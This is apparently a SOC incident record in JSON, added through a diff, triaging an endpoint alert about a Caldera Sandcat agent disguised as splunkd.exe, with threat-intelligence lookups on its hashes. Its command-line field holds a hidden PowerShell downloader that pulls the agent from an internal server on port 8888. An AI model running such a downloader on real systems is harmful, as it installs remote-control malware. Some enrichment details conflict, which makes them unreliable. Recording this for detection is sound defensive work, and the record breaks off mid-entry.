@@ -1,0 +1,1339 @@
+{
+  "incident_id": "INC-53021",
+  "classification": {
+    "alert_type": "Internal Hacking (inactive)",
+    "severity": "HIGH",
+    "triage_risk_rating": {
+      "likelihood_initiation": "High",
+      "likelihood_occurrence": "High",
+      "likelihood_adverse_impact": "High",
+      "overall_risk": "High",
+      "rationale": "High-severity NetWitness alert with risk score 70, multiple IOC matches, suspicious hidden PowerShell execution, and anomalous process/network activity on internal host 192.168.10.204 to 192.168.10.202:8888 indicate a highly likely malicious event with likely operational impact."
+    },
+    "source_risk_score": 70
+  },
+  "incident_details": {
+    "title": "High Risk Alerts: NetWitness Endpoint for KELLYWANG",
+    "timestamp": "2025-12-01T07:33:39+00:00",
+    "description": "This alert shows suspicious endpoint activity on an internal host involving hidden PowerShell with ExecutionPolicy Bypass and a likely downloader pattern contacting an internal IP on port 8888. The process 'splunkd.exe' executing from Public with related IOCs and a privileged user context indicates probable malicious activity, but there is no clear evidence of active outbreak or confirmed data loss.",
+    "mitre_att&ck": {
+      "tactic": "Command and Control",
+      "technique": "T1105 Ingress Tool Transfer"
+    }
+  },
+  "network_indicators": {
+    "source": {
+      "ip_address": "192.168.10.204",
+      "ip_addresses": [
+        "192.168.10.204",
+        "192.168.10.202",
+        "192.168.20.16"
+      ]
+    },
+    "destination": {
+      "ip_address": "192.168.10.202",
+      "ip_addresses": [
+        "192.168.10.202"
+      ],
+      "domain": "KELLYWANG"
+    },
+    "observed_domains": [
+      "KELLYWANG"
+    ]
+  },
+  "endpoint_indicators": {
+    "user": "KELLYWANG\\Kelly Wang",
+    "users": [
+      "KELLYWANG\\Kelly Wang"
+    ],
+    "hostname": "KELLYWANG",
+    "hostnames": [
+      "KELLYWANG"
+    ],
+    "operating_system": "windows",
+    "processes": {
+      "command_line": [
+        "splunkd.exe -server http://192.168.10.202:8888 -group red",
+        "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \" $server='http://192.168.10.202:8888'; $url=$server + '/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $"
+      ]
+    },
+    "files": {
+      "filename": "splunkd.exe",
+      "filenames": [
+        "splunkd.exe",
+        "powershell.exe"
+      ],
+      "hashes": [
+        "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
+        "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
+        "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+        "6bb54b2d7a3d63578559239a79700ea3"
+      ]
+    }
+  },
+  "alerts": [
+    {
+      "alert_id": "692d44cf6c4fbd7c5a167810",
+      "title": "Potential C2 Connection (Kelly)",
+      "timestamp": "2025-12-01T07:33:35.204000+00:00",
+      "severity": 7,
+      "alert_types": [
+        "Endpoint"
+      ],
+      "detection_source": "ECAT",
+      "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+      "source_ips": [
+        "192.168.10.204"
+      ],
+      "destination_ips": [
+        "192.168.10.202"
+      ],
+      "users": [
+        "KELLYWANG\\Kelly Wang"
+      ],
+      "hostnames": [
+        "KELLYWANG"
+      ],
+      "domains": [
+        "acmecorp-reset.com"
+      ]
+    },
+    {
+      "alert_id": "692d44cf6c4fbd7c5a167811",
+      "title": "Potential C2 Connection (Kelly)",
+      "timestamp": "2025-12-01T07:33:35.299000+00:00",
+      "severity": 7,
+      "alert_types": [
+        "Endpoint"
+      ],
+      "detection_source": "ECAT",
+      "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+      "source_ips": [
+        "192.168.10.204"
+      ],
+      "destination_ips": [
+        "192.168.10.202"
+      ],
+      "users": [
+        "KELLYWANG\\Kelly Wang"
+      ],
+      "hostnames": [
+        "KELLYWANG"
+      ],
+      "domains": [
+        "acmecorp-reset.com"
+      ]
+    },
+    {
+      "alert_id": "692d44d06c4fbd7c5a167812",
+      "title": "Potential C2 Connection (Kelly)",
+      "timestamp": "2025-12-01T07:33:36.268000+00:00",
+      "severity": 7,
+      "alert_types": [
+        "Endpoint"
+      ],
+      "detection_source": "ECAT",
+      "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+      "source_ips": [
+        "192.168.10.204"
+      ],
+      "destination_ips": [
+        "192.168.10.202"
+      ],
+      "users": [
+        "KELLYWANG\\Kelly Wang"
+      ],
+      "hostnames": [
+        "KELLYWANG"
+      ],
+      "domains": [
+        "acmecorp-reset.com"
+      ]
+    },
+    {
+      "alert_id": "692d44d06c4fbd7c5a167814",
+      "title": "Potential C2 Connection (Kelly)",
+      "timestamp": "2025-12-01T07:33:36.262000+00:00",
+      "severity": 7,
+      "alert_types": [
+        "Endpoint"
+      ],
+      "detection_source": "ECAT",
+      "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+      "source_ips": [
+        "192.168.10.204"
+      ],
+      "destination_ips": [
+        "192.168.10.202"
+      ],
+      "users": [
+        "KELLYWANG\\Kelly Wang"
+      ],
+      "hostnames": [
+        "KELLYWANG"
+      ],
+      "domains": [
+        "acmecorp-reset.com"
+      ]
+    },
+    {
+      "alert_id": "692d44d06c4fbd7c5a167813",
+      "title": "Potential C2 Connection (Kelly)",
+      "timestamp": "2025-12-01T07:33:36.260000+00:00",
+      "severity": 7,
+      "alert_types": [
+        "Endpoint"
+      ],
+      "detection_source": "ECAT",
+      "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+      "source_ips": [
+        "192.168.10.204"
+      ],
+      "destination_ips": [
+        "192.168.10.202"
+      ],
+      "users": [
+        "KELLYWANG\\Kelly Wang"
+      ],
+      "hostnames": [
+        "KELLYWANG"
+      ],
+      "domains": [
+        "acmecorp-reset.com"
+      ]
+    },
+    {
+      "alert_id": "692d44d06c4fbd7c5a167815",
+      "title": "Potential C2 Connection (Kelly)",
+      "timestamp": "2025-12-01T07:33:36.268000+00:00",
+      "severity": 7,
+      "alert_types": [
+        "Endpoint"
+      ],
+      "detection_source": "ECAT",
+      "connection_summary": "192.168.10.204 to 192.168.10.202-KELLYWANG",
+      "source_ips": [
+        "192.168.10.204"
+      ],
+      "destination_ips": [
+        "192.168.10.202"
+      ],
+      "users": [
+        "KELLYWANG\\Kelly Wang"
+      ],
+      "hostnames": [
+        "KELLYWANG"
+      ],
+      "domains": [
+        "acmecorp-reset.com"
+      ]
+    }
+  ],
+  "threat_intelligence_summary": "=== THREAT INTELLIGENCE SUMMARY ===\nRisk Level: Medium\nRisk Score: 60\nRisk Reasons:\n- VirusTotal reported 48 malicious detection(s) for the file hash.\n- AlienVault OTX found 1 related pulse(s) for 870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb.",
+  "threat_intelligence_enrichment": {
+    "iocs": {
+      "possible_file_name": "['splunkd.exe']",
+      "file_hash": "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
+      "powershell_analysis": {
+        "encoded_command_present": false,
+        "powershell_indicator_present": true,
+        "decode_status": "not_found",
+        "encoded_command_count": 0,
+        "decoded_command_count": 0,
+        "decoded_command_summary": "No decodable PowerShell EncodedCommand content was available in the parsed telemetry.",
+        "risk_assessment": {
+          "risk_level": "Low",
+          "risk_score": 0
+        }
+      },
+      "powershell_enrichment_note": "Decoded PowerShell IOCs were included for enrichment when available.",
+      "file_hashes": [
+        "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
+        "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+        "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
+        "6bb54b2d7a3d63578559239a79700ea3"
+      ]
+    },
+    "virustotal": {
+      "file_hash": {
+        "status": "completed",
+        "indicator": "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
+        "malicious": 48,
+        "suspicious": 0,
+        "harmless": 0,
+        "undetected": 22,
+        "reputation": 0,
+        "meaningful_name": "sandcat.go-windows",
+        "first_submission_date": 1698294719,
+        "last_analysis_date": 1787235084,
+        "timeout": 0,
+        "tags": [
+          "peexe",
+          "checks-network-adapters",
+          "64bits"
+        ],
+        "community_votes": {
+          "harmless": 0,
+          "malicious": 0
+        },
+        "top_detections": [
+          {
+            "engine": "Bkav",
+            "category": "malicious",
+            "result": "W32.Malware.6F494609"
+          },
+          {
+            "engine": "Lionic",
+            "category": "malicious",
+            "result": "Trojan.Win32.Sandcat.m!c"
+          },
+          {
+            "engine": "MicroWorld-eScan",
+            "category": "malicious",
+            "result": "Generic.Goldera.A.4FD8CBA6"
+          },
+          {
+            "engine": "CTX",
+            "category": "malicious",
+            "result": "exe.trojan.sandcat"
+          },
+          {
+            "engine": "Skyhigh",
+            "category": "malicious",
+            "result": "BehavesLike.Win64.Generic.vh"
+          },
+          {
+            "engine": "ALYac",
+            "category": "malicious",
+            "result": "Generic.Goldera.A.4FD8CBA6"
+          },
+          {
+            "engine": "Malwarebytes",
+            "category": "malicious",
+            "result": "HackTool.Caldera"
+          },
+          {
+            "engine": "VIPRE",
+            "category": "malicious",
+            "result": "Generic.Goldera.A.4FD8CBA6"
+          }
+        ],
+        "detecting_engine_count": 48,
+        "type_description": "Win32 EXE",
+        "size": 6466560,
+        "popular_threat_label": "trojan.sandcat/goldera",
+        "popular_threat_categories": [
+          "trojan",
+          "pua",
+          "hacktool"
+        ],
+        "popular_threat_names": [
+          "sandcat",
+          "goldera",
+          "caldera"
+        ]
+      },
+      "file_hash_results": [
+        {
+          "status": "completed",
+          "indicator": "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
+          "malicious": 48,
+          "suspicious": 0,
+          "harmless": 0,
+          "undetected": 22,
+          "reputation": 0,
+          "meaningful_name": "sandcat.go-windows",
+          "first_submission_date": 1698294719,
+          "last_analysis_date": 1787235084,
+          "timeout": 0,
+          "tags": [
+            "peexe",
+            "checks-network-adapters",
+            "64bits"
+          ],
+          "community_votes": {
+            "harmless": 0,
+            "malicious": 0
+          },
+          "top_detections": [
+            {
+              "engine": "Bkav",
+              "category": "malicious",
+              "result": "W32.Malware.6F494609"
+            },
+            {
+              "engine": "Lionic",
+              "category": "malicious",
+              "result": "Trojan.Win32.Sandcat.m!c"
+            },
+            {
+              "engine": "MicroWorld-eScan",
+              "category": "malicious",
+              "result": "Generic.Goldera.A.4FD8CBA6"
+            },
+            {
+              "engine": "CTX",
+              "category": "malicious",
+              "result": "exe.trojan.sandcat"
+            },
+            {
+              "engine": "Skyhigh",
+              "category": "malicious",
+              "result": "BehavesLike.Win64.Generic.vh"
+            },
+            {
+              "engine": "ALYac",
+              "category": "malicious",
+              "result": "Generic.Goldera.A.4FD8CBA6"
+            },
+            {
+              "engine": "Malwarebytes",
+              "category": "malicious",
+              "result": "HackTool.Caldera"
+            },
+            {
+              "engine": "VIPRE",
+              "category": "malicious",
+              "result": "Generic.Goldera.A.4FD8CBA6"
+            }
+          ],
+          "detecting_engine_count": 48,
+          "type_description": "Win32 EXE",
+          "size": 6466560,
+          "popular_threat_label": "trojan.sandcat/goldera",
+          "popular_threat_categories": [
+            "trojan",
+            "pua",
+            "hacktool"
+          ],
+          "popular_threat_names": [
+            "sandcat",
+            "goldera",
+            "caldera"
+          ]
+        },
+        {
+          "status": "completed",
+          "indicator": "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+          "malicious": 0,
+          "suspicious": 0,
+          "harmless": 0,
+          "undetected": 71,
+          "reputation": -16,
+          "meaningful_name": "PowerShell.EXE",
+          "first_submission_date": 1706134374,
+          "last_analysis_date": 1791229281,
+          "timeout": 0,
+          "tags": [
+            "detect-debug-environment",
+            "legit",
+            "peexe",
+            "known-distributor",
+            "long-sleeps"
+          ],
+          "community_votes": {
+            "harmless": 2,
+            "malicious": 8
+          },
+          "detecting_engine_count": 0,
+          "type_description": "Win32 EXE",
+          "size": 435712
+        },
+        {
+          "status": "completed",
+          "indicator": "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
+          "malicious": 48,
+          "suspicious": 0,
+          "harmless": 0,
+          "undetected": 22,
+          "reputation": 0,
+          "meaningful_name": "sandcat.go-windows",
+          "first_submission_date": 1698294719,
+          "last_analysis_date": 1787235084,
+          "timeout": 0,
+          "tags": [
+            "peexe",
+            "checks-network-adapters",
+            "64bits"
+          ],
+          "community_votes": {
+            "harmless": 0,
+            "malicious": 0
+          },
+          "top_detections": [
+            {
+              "engine": "Bkav",
+              "category": "malicious",
+              "result": "W32.Malware.6F494609"
+            },
+            {
+              "engine": "Lionic",
+              "category": "malicious",
+              "result": "Trojan.Win32.Sandcat.m!c"
+            },
+            {
+              "engine": "MicroWorld-eScan",
+              "category": "malicious",
+              "result": "Generic.Goldera.A.4FD8CBA6"
+            },
+            {
+              "engine": "CTX",
+              "category": "malicious",
+              "result": "exe.trojan.sandcat"
+            },
+            {
+              "engine": "Skyhigh",
+              "category": "malicious",
+              "result": "BehavesLike.Win64.Generic.vh"
+            },
+            {
+              "engine": "ALYac",
+              "category": "malicious",
+              "result": "Generic.Goldera.A.4FD8CBA6"
+            },
+            {
+              "engine": "Malwarebytes",
+              "category": "malicious",
+              "result": "HackTool.Caldera"
+            },
+            {
+              "engine": "VIPRE",
+              "category": "malicious",
+              "result": "Generic.Goldera.A.4FD8CBA6"
+            }
+          ],
+          "detecting_engine_count": 48,
+          "type_description": "Win32 EXE",
+          "size": 6466560,
+          "popular_threat_label": "trojan.sandcat/goldera",
+          "popular_threat_categories": [
+            "trojan",
+            "pua",
+            "hacktool"
+          ],
+          "popular_threat_names": [
+            "sandcat",
+            "goldera",
+            "caldera"
+          ]
+        },
+        {
+          "status": "completed",
+          "indicator": "6bb54b2d7a3d63578559239a79700ea3",
+          "malicious": 0,
+          "suspicious": 0,
+          "harmless": 0,
+          "undetected": 71,
+          "reputation": -16,
+          "meaningful_name": "PowerShell.EXE",
+          "first_submission_date": 1706134374,
+          "last_analysis_date": 1791229281,
+          "timeout": 0,
+          "tags": [
+            "detect-debug-environment",
+            "legit",
+            "peexe",
+            "known-distributor",
+            "long-sleeps"
+          ],
+          "community_votes": {
+            "harmless": 2,
+            "malicious": 8
+          },
+          "detecting_engine_count": 0,
+          "type_description": "Win32 EXE",
+          "size": 435712
+        }
+      ]
+    },
+    "alienvault_otx": {
+      "otx_results": [
+        {
+          "status": "completed",
+          "indicator": "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
+          "indicator_type": "file",
+          "pulse_count": 0,
+          "sections_available": [
+            "general",
+            "analysis"
+          ]
+        },
+        {
+          "status": "completed",
+          "indicator": "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+          "indicator_type": "file",
+          "pulse_count": 1,
+          "related_pulses": [
+            "LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing"
+          ],
+          "sections_available": [
+            "general",
+            "analysis"
+          ],
+          "pulses": [
+            {
+              "name": "LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing",
+              "created": "2026-05-15T23:01:06.396000",
+              "modified": "2026-05-15T23:01:06.396000",
+              "tags": [
+                "brazil",
+                "banking-trojan",
+                "delphi",
+                "mshta",
+                "dga"
+              ],
+              "malware_families": [
+                "Grandoreiro",
+                "NewGrandoreiro"
+              ],
+              "adversary": "TA558",
+              "attack_ids": [
+                "T1566",
+                "T1055",
+                "T1568.002"
+              ],
+              "tlp": "white"
+            }
+          ],
+          "pulse_tags": [
+            "brazil",
+            "banking-trojan",
+            "delphi",
+            "mshta",
+            "dga",
+            "pga",
+            "lolbin",
+            "phishing",
+            "c2",
+            "python"
+          ],
+          "malware_families": [
+            "Grandoreiro",
+            "NewGrandoreiro",
+            "Newgrandoreiro"
+          ],
+          "adversaries": [
+            "TA558"
+          ],
+          "attack_ids": [
+            "T1566",
+            "T1055",
+            "T1568.002"
+          ],
+          "latest_pulse_modified": "2026-05-15T23:01:06.396000"
+        },
+        {
+          "status": "completed",
+          "indicator": "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
+          "indicator_type": "file",
+          "pulse_count": 0,
+          "sections_available": [
+            "general",
+            "analysis"
+          ]
+        },
+        {
+          "status": "completed",
+          "indicator": "6bb54b2d7a3d63578559239a79700ea3",
+          "indicator_type": "file",
+          "pulse_count": 0,
+          "sections_available": [
+            "general",
+            "analysis"
+          ]
+        }
+      ]
+    },
+    "notes": [
+      "No usable public IP indicators were found. AbuseIPDB, VirusTotal IP, and OTX IP lookups were skipped.",
+      "No usable external domain indicators were found. VirusTotal domain and OTX domain lookups were skipped.",
+      "PowerShell activity was detected, but no decodable EncodedCommand content was available for IOC extraction."
+    ],
+    "indicators": [
+      {
+        "value": "4854484a90704cff48d94f6f55238d965f4820803a674d8a46959866420fc607",
+        "type": "hash",
+        "origins": [
+          "Parsed file indicators",
+          "Parsed IOC summary",
+          "Alert field",
+          "Related IOCs",
+          "NetWitness alert metadata"
+        ],
+        "eligible": true,
+        "status": "enriched",
+        "providers_queried": 2,
+        "providers_answered": 2,
+        "providers": {
+          "virustotal": {
+            "status": "completed",
+            "malicious": 48,
+            "suspicious": 0,
+            "harmless": 0,
+            "undetected": 22,
+            "reputation": 0,
+            "tags": [
+              "peexe",
+              "checks-network-adapters",
+              "64bits"
+            ],
+            "community_votes": {
+              "harmless": 0,
+              "malicious": 0
+            },
+            "top_detections": [
+              {
+                "engine": "Bkav",
+                "category": "malicious",
+                "result": "W32.Malware.6F494609"
+              },
+              {
+                "engine": "Lionic",
+                "category": "malicious",
+                "result": "Trojan.Win32.Sandcat.m!c"
+              },
+              {
+                "engine": "MicroWorld-eScan",
+                "category": "malicious",
+                "result": "Generic.Goldera.A.4FD8CBA6"
+              },
+              {
+                "engine": "CTX",
+                "category": "malicious",
+                "result": "exe.trojan.sandcat"
+              },
+              {
+                "engine": "Skyhigh",
+                "category": "malicious",
+                "result": "BehavesLike.Win64.Generic.vh"
+              },
+              {
+                "engine": "ALYac",
+                "category": "malicious",
+                "result": "Generic.Goldera.A.4FD8CBA6"
+              },
+              {
+                "engine": "Malwarebytes",
+                "category": "malicious",
+                "result": "HackTool.Caldera"
+              },
+              {
+                "engine": "VIPRE",
+                "category": "malicious",
+                "result": "Generic.Goldera.A.4FD8CBA6"
+              }
+            ],
+            "detecting_engine_count": 48,
+            "analysed_vendors": 70,
+            "last_analysed_at": "2026-08-20T14:11:24+00:00",
+            "meaningful_name": "sandcat.go-windows",
+            "type_description": "Win32 EXE",
+            "popular_threat_label": "trojan.sandcat/goldera",
+            "popular_threat_categories": [
+              "trojan",
+              "pua",
+              "hacktool"
+            ],
+            "popular_threat_names": [
+              "sandcat",
+              "goldera",
+              "caldera"
+            ],
+            "first_submitted_at": "2023-10-26T04:31:59+00:00"
+          },
+          "abuseipdb": {
+            "status": "not_applicable"
+          },
+          "otx": {
+            "status": "completed",
+            "pulse_count": 0
+          }
+        },
+        "context": [
+          {
+            "field": "meaningful_name",
+            "label": "File name (VirusTotal)",
+            "value": "sandcat.go-windows",
+            "sources": [
+              "VirusTotal"
+            ]
+          },
+          {
+            "field": "type_description",
+            "label": "File type",
+            "value": "Win32 EXE",
+            "sources": [
+              "VirusTotal"
+            ]
+          },
+          {
+            "field": "popular_threat_label",
+            "label": "Threat label",
+            "value": "trojan.sandcat/goldera",
+            "sources": [
+              "VirusTotal"
+            ]
+          },
+          {
+            "field": "popular_threat_names",
+            "label": "Malware family names",
+            "value": "sandcat, goldera, caldera",
+            "sources": [
+              "VirusTotal"
+            ]
+          }
+        ],
+        "freshness": [
+          {
+            "label": "First submitted to VirusTotal",
+            "value": "2023-10-26T04:31:59+00:00",
+            "source": "VirusTotal"
+          },
+          {
+            "label": "Last VirusTotal analysis",
+            "value": "2026-08-20T14:11:24+00:00",
+            "source": "VirusTotal"
+          }
+        ],
+        "hash_type": "sha256"
+      },
+      {
+        "value": "870eda04ea71cc066ec907f005e1d05ce592f04799c60e600e2cb986dc85b5eb",
+        "type": "hash",
+        "origins": [
+          "Parsed file indicators",
+          "Parsed IOC summary",
+          "Related IOCs",
+          "NetWitness alert metadata"
+        ],
+        "eligible": true,
+        "status": "enriched",
+        "providers_queried": 2,
+        "providers_answered": 2,
+        "providers": {
+          "virustotal": {
+            "status": "completed",
+            "malicious": 0,
+            "suspicious": 0,
+            "harmless": 0,
+            "undetected": 71,
+            "reputation": -16,
+            "tags": [
+              "detect-debug-environment",
+              "legit",
+              "peexe",
+              "known-distributor",
+              "long-sleeps"
+            ],
+            "community_votes": {
+              "harmless": 2,
+              "malicious": 8
+            },
+            "detecting_engine_count": 0,
+            "analysed_vendors": 71,
+            "last_analysed_at": "2026-10-05T19:41:21+00:00",
+            "meaningful_name": "PowerShell.EXE",
+            "type_description": "Win32 EXE",
+            "first_submitted_at": "2024-01-24T22:12:54+00:00"
+          },
+          "abuseipdb": {
+            "status": "not_applicable"
+          },
+          "otx": {
+            "status": "completed",
+            "pulse_count": 1,
+            "related_pulses": [
+              "LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing"
+            ],
+            "pulses": [
+              {
+                "name": "LATAM Banking Trojan: 0-Click WebDAV to MSHTA Process Hollowing",
+                "created": "2026-05-15T23:01:06.396000",
+                "modified": "2026-05-15T23:01:06.396000",
+                "tags": [
+                  "brazil",
+                  "banking-trojan",
+                  "delphi",
+                  "mshta",
+                  "dga"
+                ],
+                "malware_families": [
+                  "Grandoreiro",
+                  "NewGrandoreiro"
+                ],
+                "adversary": "TA558",
+                "attack_ids": [
+                  "T1566",
+                  "T1055",
+                  "T1568.002"
+                ],
+                "tlp": "white"
+              }
+            ],
+            "pulse_tags": [
+              "brazil",
+              "banking-trojan",
+              "delphi",
+              "mshta",
+              "dga",
+              "pga",
+              "lolbin",
+              "phishing",
+              "c2",
+              "python"
+            ],
+            "malware_families": [
+              "Grandoreiro",
+              "NewGrandoreiro",
+              "Newgrandoreiro"
+            ],
+            "adversaries": [
+              "TA558"
+            ],
+            "attack_ids": [
+              "T1566",
+              "T1055",
+              "T1568.002"
+            ],
+            "latest_pulse_modified": "2026-05-15T23:01:06.396000"
+          }
+        },
+        "context": [
+          {
+            "field": "meaningful_name",
+            "label": "File name (VirusTotal)",
+            "value": "PowerShell.EXE",
+            "sources": [
+              "VirusTotal"
+            ]
+          },
+          {
+            "field": "type_description",
+            "label": "File type",
+            "value": "Win32 EXE",
+            "sources": [
+              "VirusTotal"
+            ]
+          }
+        ],
+        "freshness": [
+          {
+            "label": "First submitted to VirusTotal",
+            "value": "2024-01-24T22:12:54+00:00",
+            "source": "VirusTotal"
+          },
+          {
+            "label": "Last VirusTotal analysis",
+            "value": "2026-10-05T19:41:21+00:00",
+            "source": "VirusTotal"
+          },
+          {
+            "label": "Most recent OTX pulse update",
+            "value": "2026-05-15T23:01:06.396000",
+            "source": "AlienVault OTX"
+          }
+        ],
+        "hash_type": "sha256"
+      },
+      {
+        "value": "0ddcc6af9a1d9e91f6f5f2e7cad26cb0",
+        "type": "hash",
+        "origins": [
+          "NetWitness alert metadata"
+        ],
+        "eligible": true,
+        "status": "enriched",
+        "providers_queried": 2,
+        "providers_answered": 2,
+        "providers": {
+          "virustotal": {
+            "status": "completed",
+            "malicious": 48,
+            "suspicious": 0,
+            "harmless": 0,
+            "undetected": 22,
+            "reputation": 0,
+            "tags": [
+              "peexe",
+              "checks-network-adapters",
+              "64bits"
+            ],
+            "community_votes": {
+              "harmless": 0,
+              "malicious": 0
+            },
+            "top_detections": [
+              {
+                "engine": "Bkav",
+                "category": "malicious",
+                "result": "W32.Malware.6F494609"
+              },
+              {
+                "engine": "Lionic",
+                "category": "malicious",
+                "result": "Trojan.Win32.Sandcat.m!c"
+              },
+              {
+                "engine": "MicroWorld-eScan",
+                "category": "malicious",
+                "result": "Generic.Goldera.A.4FD8CBA6"
+              },
+              {
+                "engine": "CTX",
+                "category": "malicious",
+                "result": "exe.trojan.sandcat"
+              },
+              {
+                "engine": "Skyhigh",
+                "category": "malicious",
+                "result": "BehavesLike.Win64.Generic.vh"
+              },
+              {
+                "engine": "ALYac",
+                "category": "malicious",
+                "result": "Generic.Goldera.A.4FD8CBA6"
+              },
+              {
+                "engine": "Malwarebytes",
+                "category": "malicious",
+                "result": "HackTool.Caldera"
+              },
+              {
+                "engine": "VIPRE",
+                "category": "malicious",
+                "result": "Generic.Goldera.A.4FD8CBA6"
+              }
+            ],
+            "detecting_engine_count": 48,
+            "analysed_vendors": 70,
+            "last_analysed_at": "2026-08-20T14:11:24+00:00",
+            "meaningful_name": "sandcat.go-windows",
+            "type_description": "Win32 EXE",
+            "popular_threat_label": "trojan.sandcat/goldera",
+            "popular_threat_categories": [
+              "trojan",
+              "pua",
+              "hacktool"
+            ],
+            "popular_threat_names": [
+              "sandcat",
+              "goldera",
+              "caldera"
+            ],
+            "first_submitted_at": "2023-10-26T04:31:59+00:00"
+          },
+          "abuseipdb": {
+            "status": "not_applicable"
+          },
+          "otx": {
+            "status": "completed",
+            "pulse_count": 0
+          }
+        },
+        "context": [
+          {
+            "field": "meaningful_name",
+            "label": "File name (VirusTotal)",
+            "value": "sandcat.go-windows",
+            "sources": [
+              "VirusTotal"
+            ]
+          },
+          {
+            "field": "type_description",
+            "label": "File type",
+            "value": "Win32 EXE",
+            "sources": [
+              "VirusTotal"
+            ]
+          },
+          {
+            "field": "popular_threat_label",
+            "label": "Threat label",
+            "value": "trojan.sandcat/goldera",
+            "sources": [
+              "VirusTotal"
+            ]
+          },
+          {
+            "field": "popular_threat_names",
+            "label": "Malware family names",
+            "value": "sandcat, goldera, caldera",
+            "sources": [
+              "VirusTotal"
+            ]
+          }
+        ],
+        "freshness": [
+          {
+            "label": "First submitted to VirusTotal",
+            "value": "2023-10-26T04:31:59+00:00",
+            "source": "VirusTotal"
+          },
+          {
+            "label": "Last VirusTotal analysis",
+            "value": "2026-08-20T14:11:24+00:00",
+            "source": "VirusTotal"
+          }
+        ],
+        "hash_type": "md5"
+      },
+      {
+        "value": "6bb54b2d7a3d63578559239a79700ea3",
+        "type": "hash",
+        "origins": [
+          "NetWitness alert metadata"
+        ],
+        "eligible": true,
+        "status": "enriched",
+        "providers_queried": 2,
+        "providers_answered": 2,
+        "providers": {
+          "virustotal": {
+            "status": "completed",
+            "malicious": 0,
+            "suspicious": 0,
+            "harmless": 0,
+            "undetected": 71,
+            "reputation": -16,
+            "tags": [
+              "detect-debug-environment",
+              "legit",
+              "peexe",
+              "known-distributor",
+              "long-sleeps"
+            ],
+            "community_votes": {
+              "harmless": 2,
+              "malicious": 8
+            },
+            "detecting_engine_count": 0,
+            "analysed_vendors": 71,
+            "last_analysed_at": "2026-10-05T19:41:21+00:00",
+            "meaningful_name": "PowerShell.EXE",
+            "type_description": "Win32 EXE",
+            "first_submitted_at": "2024-01-24T22:12:54+00:00"
+          },
+          "abuseipdb": {
+            "status": "not_applicable"
+          },
+          "otx": {
+            "status": "completed",
+            "pulse_count": 0
+          }
+        },
+        "context": [
+          {
+            "field": "meaningful_name",
+            "label": "File name (VirusTotal)",
+            "value": "PowerShell.EXE",
+            "sources": [
+              "VirusTotal"
+            ]
+          },
+          {
+            "field": "type_description",
+            "label": "File type",
+            "value": "Win32 EXE",
+            "sources": [
+              "VirusTotal"
+            ]
+          }
+        ],
+        "freshness": [
+          {
+            "label": "First submitted to VirusTotal",
+            "value": "2024-01-24T22:12:54+00:00",
+            "source": "VirusTotal"
+          },
+          {
+            "label": "Last VirusTotal analysis",
+            "value": "2026-10-05T19:41:21+00:00",
+            "source": "VirusTotal"
+          }
+        ],
+        "hash_type": "md5"
+      },
+      {
+        "value": "192.168.10.204",
+        "type": "ip",
+        "roles": [
+          "source"
+        ],
+        "origins": [
+          "Parsed network indicators",
+          "Alert field",
+          "Parsed IOC summary",
+          "Related IOCs",
+          "NetWitness alert metadata"
+        ],
+        "eligible": false,
+        "status": "excluded",
+        "status_category": "private",
+        "status_reason": "Private/internal address",
+        "providers_queried": 0,
+        "providers_answered": 0
+      },
+      {
+        "value": "192.168.10.202",
+        "type": "ip",
+        "roles": [
+          "destination"
+        ],
+        "origins": [
+          "Parsed network indicators",
+          "Alert field",
+          "Parsed IOC summary",
+          "Related IOCs",
+          "NetWitness alert metadata"
+        ],
+        "eligible": false,
+        "status": "excluded",
+        "status_category": "private",
+        "status_reason": "Private/internal address",
+        "providers_queried": 0,
+        "providers_answered": 0
+      },
+      {
+        "value": "['kellywang']",
+        "type": "domain",
+        "origins": [
+          "Parsed user/host indicators",
+          "Parsed IOC summary",
+          "Alert field",
+          "Related IOCs"
+        ],
+        "eligible": false,
+        "status": "excluded",
+        "status_category": "internal_hostname",
+        "status_reason": "Internal hostname — no public domain suffix",
+        "providers_queried": 0,
+        "providers_answered": 0
+      },
+      {
+        "value": "['splunkd.exe']",
+        "type": "file_name",
+        "origins": [
+          "Parsed file indicators",
+          "Parsed IOC summary",
+          "Alert field",
+          "Related IOCs"
+        ],
+        "eligible": false,
+        "status": "excluded",
+        "status_category": "unsupported_type",
+        "status_reason": "Not enriched — file reputation lookups require a file hash",
+        "providers_queried": 0,
+        "providers_answered": 0
+      },
+      {
+        "value": "kellywang",
+        "type": "domain",
+        "origins": [
+          "Parsed user/host indicators",
+          "Parsed IOC summary",
+          "Related IOCs"
+        ],
+        "eligible": false,
+        "status": "excluded",
+        "status_category": "internal_hostname",
+        "status_reason": "Internal hostname — no public domain suffix",
+        "providers_queried": 0,
+        "providers_answered": 0
+      },
+      {
+        "value": "['powershell.exe']",
+        "type": "file_name",
+        "origins": [
+          "Parsed file indicators",
+          "Parsed IOC summary",
+          "Related IOCs"
+        ],
+        "eligible": false,
+        "status": "excluded",
+        "status_category": "unsupported_type",
